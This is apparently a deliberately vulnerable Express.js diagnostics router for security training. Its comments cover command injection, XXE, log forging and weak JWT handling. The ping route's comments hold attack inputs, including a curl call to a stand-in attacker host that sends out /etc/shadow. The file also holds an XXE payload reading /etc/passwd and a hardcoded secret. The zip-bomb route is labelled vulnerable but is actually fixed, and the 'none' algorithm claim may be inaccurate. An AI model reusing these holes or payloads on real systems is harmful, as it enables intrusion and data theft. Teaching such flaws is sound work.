// ============================================================
// VULNERABILITIES #48-52: System Diagnostics & Monitoring
//   #48 Command Injection via ping (CWE-78)
//   #49 XML External Entity Injection (CWE-611)
//   #50 Log Forging / Log Injection (CWE-117)
//   #51 Uncontrolled Resource Consumption - zip bomb (CWE-400)
//   #52 Hardcoded JWT Secret with None Algorithm (CWE-347)
// ============================================================

const express = require('express');
const router = express.Router();
const { execSync } = require('child_process');
const { parseString } = require('xml2js');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const zlib = require('zlib');

// VULN #48: Command Injection (CWE-78)
// User-supplied hostname is passed directly to shell command
// without any sanitization or validation
router.get('/ping', (req, res) => {
  const { host } = req.query;

  if (!host) {
    return res.status(400).json({ error: 'Host parameter required' });
  }

  try {
    // VULNERABLE: Direct string interpolation into shell command
    // Attacker: /api/diagnostics/ping?host=google.com;cat /etc/passwd
    // Attacker: /api/diagnostics/ping?host=$(whoami)
    // Attacker: /api/diagnostics/ping?host=127.0.0.1 && curl attacker.com/steal?data=$(cat /etc/shadow)
    const output = execSync(`ping -c 3 ${host}`, {
      timeout: 10000,
      encoding: 'utf-8',
    });

    res.json({
      host: host,
      result: output,
      timestamp: new Date().toISOString(),
    });
  } catch (err) {
    res.status(500).json({
      error: 'Ping failed',
      details: err.stderr || err.message,
      command: `ping -c 3 ${host}`,  // Leaks the executed command
    });
  }
});

// VULN #49: XML External Entity Injection (CWE-611)
// Parses user-supplied XML without disabling external entities
// Allows reading arbitrary files from the server filesystem
router.post('/health-check', (req, res) => {
  const xmlData = req.body.xml || req.body;

  if (!xmlData || typeof xmlData !== 'string') {
    return res.status(400).json({ error: 'XML body required' });
  }

  // VULNERABLE: XML parsing with external entities enabled by default
  // Attacker sends:
  // <?xml version="1.0"?>
  // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  // <health><service>&xxe;</service></health>
  parseString(xmlData, { explicitArray: false }, (err, result) => {
    if (err) {
      return res.status(400).json({ error: 'Invalid XML', details: err.message });
    }

    res.json({
      parsed: result,
      services_checked: Object.keys(result).length,
      timestamp: new Date().toISOString(),
    });
  });
});

// VULN #50: Log Forging / Log Injection (CWE-117)
// User input written directly to logs without sanitization
// Attacker can inject fake log entries or corrupt log analysis
router.post('/audit-log', (req, res) => {
  const { action, resource, details } = req.body;
  const userAgent = req.headers['user-agent'];
  const clientIp = req.headers['x-forwarded-for'] || req.ip;

  // VULNERABLE: User-controlled values written directly to log
  // Attacker can inject newlines to create fake log entries:
  // action: "login\n[CRITICAL] Admin password changed by root from 10.0.0.1"
  // This corrupts log integrity and can mislead forensic analysis
  const logEntry = `[${new Date().toISOString()}] ACTION=${action} RESOURCE=${resource} IP=${clientIp} UA=${userAgent} DETAILS=${details}`;

  // Write to file without sanitization
  fs.appendFileSync('/tmp/audit.log', logEntry + '\n');
  console.log(logEntry);

  res.json({
    logged: true,
    entry: logEntry,  // Also returns the raw log entry to the attacker
    log_file: '/tmp/audit.log',  // Exposes internal file path
  });
});

// VULN #51: Uncontrolled Resource Consumption (CWE-400)
// Decompresses user-uploaded data without checking decompressed size
// A small gzip "bomb" (e.g., 42.zip) can expand to gigabytes in memory
router.post('/import-config', (req, res) => {
  const compressedData = req.body.data;

  if (!compressedData) {
    return res.status(400).json({ error: 'Compressed config data required' });
  }

  try {
    // FIX: Limit decompressed size to prevent zip bomb (max 10MB)
    const buffer = Buffer.from(compressedData, 'base64');

    // Use streaming decompression to enforce max decompressed size
    const MAX_DECOMPRESSED_SIZE = 10 * 1024 * 1024; // 10 MB
    let decompressedSize = 0;
    const decompressedChunks = [];

    const gunzip = zlib.createGunzip();

    gunzip.on('data', (chunk) => {
      decompressedSize += chunk.length;
      if (decompressedSize > MAX_DECOMPRESSED_SIZE) {
        // Stop processing and emit error if size limit exceeded
        gunzip.destroy(new Error('Decompressed data exceeds limit'));
      } else {
        decompressedChunks.push(chunk);
      }
    });

    gunzip.on('end', () => {
      try {
        const decompressed = Buffer.concat(decompressedChunks);
        const config = JSON.parse(decompressed.toString('utf-8'));

        res.json({
          message: 'Config imported successfully',
          keys: Object.keys(config),
          size_compressed: buffer.length,
          size_decompressed: decompressed.length,
        });
      } catch (jsonErr) {
        res.status(400).json({ error: 'Invalid JSON in decompressed data', details: jsonErr.message });
      }
    });

    gunzip.on('error', (err) => {
      res.status(400).json({ error: 'Import failed', details: err.message });
    });

    // Trigger decompression
    gunzip.end(buffer);

  } catch (err) {
    res.status(400).json({ error: 'Import failed', details: err.message });
  }
});

// VULN #52: JWT Verification with Hardcoded Secret + None Algorithm (CWE-347)
// Uses a weak hardcoded secret AND doesn't restrict allowed algorithms
// Attacker can forge tokens using "none" algorithm (no signature needed)
const JWT_SECRET = 'super-secret-key-123';  // VULNERABLE: Hardcoded weak secret

router.post('/verify-token', (req, res) => {
  const { token } = req.body;

  if (!token) {
    return res.status(400).json({ error: 'Token required' });
  }

  try {
    // VULNERABLE: No algorithms restriction - accepts "none" algorithm
    // Attacker creates token with {"alg":"none"} header and empty signature
    // jwt.verify will accept it without any signature validation
    const decoded = jwt.verify(token, JWT_SECRET);

    res.json({
      valid: true,
      payload: decoded,
      issued_at: new Date(decoded.iat * 1000).toISOString(),
      expires_at: decoded.exp ? new Date(decoded.exp * 1000).toISOString() : 'never',
      secret_hint: JWT_SECRET.substring(0, 5) + '...',  // Leaks part of the secret
    });
  } catch (err) {
    res.status(401).json({
      valid: false,
      error: err.message,
      algorithm_used: err.message.includes('algorithm') ? 'Check algorithm header' : 'unknown',
    });
  }
});

module.exports = router;